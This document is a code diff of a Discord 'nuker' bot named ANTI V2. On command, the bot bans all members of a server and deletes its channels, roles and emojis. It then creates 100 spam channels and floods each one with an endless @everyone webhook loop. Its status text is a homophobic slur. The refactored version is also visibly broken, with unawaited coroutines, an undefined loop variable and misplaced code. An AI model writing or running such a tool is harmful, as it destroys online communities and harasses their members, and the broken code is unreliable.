@@ -1,150 +1,163 @@
-from typing import ContextManager
-import discord
-import colorama
-from colorama import Fore as F, Style as S
-colorama.init()
+import discord, json, os, threading, asyncio
 from discord.ext import commands
-import json
-import os
-colorama.init()
 
-r = F.RED
-w = F.RESET
-g = F.GREEN
+THREADS = 5
 
-def ascii():
-    print(f'''
-          
-                                          {w}.-''-.{r}     
-              _..._            .--.     {w}.' .-.  ){r}    
-            .'     '.          |__|    {w}/ .'  / /{r}     
-           .   .-.   .     .|  .--.   {w}(_/   / /{r}      
-     __    |  '   '  |   .' |_ |  |  {w}      / /{r}       
-  .:--.'.  |  |   |  | .'     ||  |  {w}     / /{r}        
- / |   \ | |  |   |  |'--.  .-'|  |  {w}    . '{r}         
- `" __ | | |  |   |  |   |  |  |  |  {w}   / /    _.-'){r} 
-  .'.''| | |  |   |  |   |  |  |__| {w}  .' '  _.'.-''{r}  
- / /   | |_|  |   |  |   |  '.'     {w} /  /.-'_.'{r}      
- \ \._,\ '/|  |   |  |   |   /     {w} /    _.'{r}         
-  `--'  `" '--'   '--'   `'-'      {w}( _.-'                                  
-    
-''')
+class c:
+    """ Program Colors """
+    r = u"\u001b[31m"
+    g  = u"\u001b[32m"
+    w  = u"\u001b[0m"
 
-ascii()
-tokeninput = f'[>] Please enter your Bot Token: '
-TOKEN = input(tokeninput)
+class Anti:
+    """ Nukers are cringe I made this ages ago """
+    def __init__(a2):
+        a2.token  = input(f'[>] Please enter your Bot Token: ')
+        a2.banned = []
+        a2.roles  = []
+        a2.emojis = []
+        a2.channels = []
 
+        a2.menuascii = f"""
+    {c.r}   ╔═══════════════════════════════════════╗
+                  {c.w} Nukers are Cringe {c.r}                      
+    {c.r}   ╚═══════════════════════════════════════╝
+       {c.r}╔══════════════════╗ {c.r}╔══════════════════╗
+            {c.w}Commands             {c.w}Creators
+         
+       {c.r}  $w {c.w}| {c.r}$nk {c.w}| {c.r}$help  {c.r}    Chills {c.w}| {c.r}Doopy  
+       {c.r}╚══════════════════╝ {c.r}╚══════════════════╝
+       {c.r}╔═══════════════════════════════════════╗
+                     {c.w}Command-Line
+        """
+        a2.banner = f'''
+                                             {c.w}.-''-.{c.r}     
+                  _..._           .--.     {c.w}.' .-.  ){c.r}    
+                .'     '.         |__|    {c.w}/ .'  / /{c.r}     
+              .   .-.   .     .|  .--.   {c.w}(_/   / /{c.r}      
+        __    |  '   '  |   .' |_ |  |  {c.w}      / /{c.r}       
+     .:--.'.  |  |   |  | .'     ||  |  {c.w}     / /{c.r}        
+    / |   \ | |  |   |  |'--.  .-'|  |  {c.w}    . '{c.r}         
+    `" __ | | |  |   |  |   |  |  |  |  {c.w}   / /    _.-'){c.r} 
+     .'.''| | |  |   |  |   |  |  |__| {c.w}  .' '  _.'.-''{c.r}  
+    / /   | |_|  |   |  |   |  '.'     {c.w} /  /.-'_.'{c.r}      
+    \ \._,\ '/|  |   |  |   |   /     {c.w} /    _.'{c.r}         
+      `--'  `" '--'   '--'   `'-'      {c.w}( _.-'                                  
+                  github.com/{c.r}codeuk{c.w}
+        '''
 
-os.system('cls')
+        a2.ASCII()
+        a2.antinet = commands.Bot(command_prefix='$', intents = discord.Intents.all())
 
-def main():
-    ()
-    headers = {
-        "authorization" : TOKEN
-    }
-	
-os.system('cls')	
-os.system('title ┼ ANTI V2 ┼')
-ascii()
-antinet = commands.Bot(command_prefix='$', intents = discord.Intents.all())
+    def ASCII(a2):
+        os.system('cls')	
+        os.system('title ┼ ANTI V2 ┼')
+        print(a2.banner)
 
-@antinet.event
-async def on_ready():
-    await antinet.change_presence(status=discord.Status.idle, activity=discord.Game('AntiGays'))
-    print(f'''
- {r}   ╔═══════════════════════════════════════╗
-                  {F.RESET} Anti Nuker v2  {r}        
-    ╚═══════════════════════════════════════╝
+    @staticmethod
+    def Log(i, msg, worked=True):
+        logc = c.g if worked else c.r
+        print(f'{" "*15}{c.w}[{logc}{i}{c.w}] {msg}')
 
-    {r}╔══════════════════╗ {r}╔══════════════════╗
-          {F.RESET}Commands             {F.RESET}Creators
-		  
-    {r}  $w {F.RESET}| {r}$nk {F.RESET}| {r}$help  {r}    Chills {F.RESET}| {r}Doopy  
-    {r}╚══════════════════╝ {r}╚══════════════════╝
+    @staticmethod
+    def StartThreads(func, m, c, r, e) -> None:
+        for i in range(THREADS):
+            thread = threading.Thread(target=func, args=(m, c, r, e))
+            thread.start()
 
+    async def Ban(a2, member):
+        a2.banned.append(member)
+        try:
+            await member.ban(reason='lol')
+            a2.Log(i, "Member Banned")
+        except: a2.Log(i, "Member Not Banned", worked=False)
 
-    {r}╔═══════════════════════════════════════╗
-                  {F.RESET}Command-Line
+    async def Channels(a2, channel):
+        a2.channels.append(channel)
+        try:
+            await channel.delete()
+            a2.Log(i, "Channel Deleted")
+        except: a2.Log(i, "Channel Not Deleted", worked=False)
 
-''')
+    async def Roles(a2, role):
+        a2.roles.append(role)
+        try:
+            await role.delete()
+            a2.Log(i, "Role Deleted")
+        except: a2.Log(i, "Role Not Deleted", worked=False)
 
-antinet.remove_command('help')
+    async def Emojis(a2, emoji):
+        a2.emojis.append(emoji)
+        try:
+            await emoji.delete()
+            a2.Log(i, "Emoji Deleted")
+        except: a2.Log(i, "Emoji Not Deleted", worked=False)
 
-@antinet.command()
-async def w(ctx, *, message):
-    print(f'             {F.RESET}[{r}${F.RESET}] Command Used: $w ')
-    print(f'               {F.RESET}[{g}+{F.RESET}] Watching Text: {message}')
-    print(' ')
-    await ctx.message.delete()
-    await antinet.change_presence(
-	
-        activity=discord.Activity(
-            type=discord.ActivityType.watching,
-            name=message
-			
-        ))
+        for i in range(100):
+            await ctx.guild.create_text_channel("github com wnfo")
+            print(f'               {c.w}[{c.g}+{c.w}] Created Channel')
 
-@antinet.command()
-async def clear(ctx):
-    os.system('cls')
-    print(f'''
- {r}   ╔═══════════════════════════════════════╗
-                  {F.RESET} Anti Nuker v2  {r}        
-    ╚═══════════════════════════════════════╝
+    def Nuke(a2, members, channels, roles, emojis) -> None:
+        for i, member in enumerate(members):
+            if member in a2.banned: continue
+            else: a2.Ban(member)
 
-    {r}╔══════════════════╗ {r}╔══════════════════╗
-          {F.RESET}Commands             {F.RESET}Creators
-		  
-    {r}  $w {F.RESET}| {r}$nk {F.RESET}| {r}$help  {r}    Chills {F.RESET}| {r}@wnfo  
-    {r}╚══════════════════╝ {r}╚══════════════════╝
+        for i, channel in enumerate(channels):
+            if channel in a2.channels: continue
+            else: a2.Channels(channel)
 
+        for i, role in enumerate(roles):
+            if role in a2.roles: continue
+            else: a2.Roles(role)
 
-    {r}╔═══════════════════════════════════════╗
-                  {F.RESET}Command-Line
-''')
-    print(f'             {F.RESET}[{r}${F.RESET}] Command Used: $clear')
+        for i, emoji in enumerate(emojis):
+            if emoji in a2.emojis: continue
+            else: a2.Emojis(emoji)
 
-@antinet.command(aliases=['nuke'])
-async def nk(ctx):
-  await ctx.message.delete()
-  print(f'             {F.RESET}[{r}${F.RESET}] Command Used: $n')
-  for channel in ctx.guild.channels:
-    try:
-      await channel.delete()
-      print(f'               {F.RESET}[{g}+{F.RESET}] Channel Deleted')
-    except Exception as e:
-      print(f'               {F.RESET}[{r}-{F.RESET}] Channel NOT Deleted')
+    def Main(a2) -> None:
+        @a2.antinet.event
+        async def on_ready():
+            await a2.antinet.change_presence(status=discord.Status.idle, activity=discord.Game('AntiGays'))
+            print(a2.menuascii)
 
-  for member in ctx.guild.members:
-    try:
-      await member.ban(reason='ANTI v2')
-      print(f'               {F.RESET}[{g}+{F.RESET}] Member Banned')
-    except Exception as e:
-      print(f'               {F.RESET}[{r}-{F.RESET}] Member NOT Banned')
+        a2.antinet.remove_command('help')
 
-  for role in ctx.guild.roles:
-    try:
-      await role.delete()
-      print(f'               {F.RESET}[{g}+{F.RESET}] Role Deleted')
-    except Exception as e:
-      print(f'               {F.RESET}[{r}-{F.RESET}] Role NOT Deleted')
+        @a2.antinet.command()
+        async def w(ctx, *, message):
+            print(f'             {c.w}[{c.r}${c.w}] Command Used: $w ')
+            print(f'               {c.w}[{c.g}+{c.w}] Watching Text: {message}\n')
+            await ctx.message.delete()
+            await a2.antinet.change_presence(activity=discord.Activity(
+                type=discord.ActivityType.watching,
+                name=message
+            ))
 
-  for emoji in list(ctx.guild.emojis):
-    try:
-      await emoji.delete()
-      print(f'               {F.RESET}[{g}+{F.RESET}] Emoji Deleted')
-    except:
-      print(f'               {F.RESET}[{r}-{F.RESET}] Emoji NOT Deleted')
-	  
-  for i in range(100):
-    await ctx.guild.create_text_channel("github com wnfo")
-    print(f'               {F.RESET}[{g}+{F.RESET}] Created Channel')
+        @a2.antinet.command()
+        async def clear(ctx):
+            os.system('cls')
+            print(a2.menuascii)
+            print(f'             {c.w}[{c.r}${c.w}] Command Used: $clear')
 
-@antinet.event
-async def on_guild_channel_create(channel):
-  web = await channel.create_webhook(name="AntiV2 Nuker")
-  while True:
-    await web.send('@everyone @here AntiV2 - github.com/wnfo')
-    await channel.send('@everyone @here AntiV2 - github.com/wnfo')
+        @a2.antinet.command(aliases=['nuke', 'n'])
+        async def nk(ctx):
+            await ctx.message.delete()
+            print(f'             {c.w}[{c.r}${c.w}] Command Used: $n')
+            a2.StartThreads(
+              a2.Nuke,
+              ctx.guild.members,
+              ctx.guild.channels,
+              ctx.guild.roles,
+              ctx.guild.emojis
+            )
 
-antinet.run(TOKEN)
+        @a2.antinet.event
+        async def on_guild_channel_create(channel):
+            web = await channel.create_webhook(name="AntiV2 Nuker")
+            while True:
+                await web.send('@everyone @here AntiV2 - github.com/wnfo')
+                await channel.send('@everyone @here AntiV2 - github.com/wnfo')
+
+        a2.antinet.run(a2.token)
+
+CringeNuker = Anti()
+CringeNuker.Main()
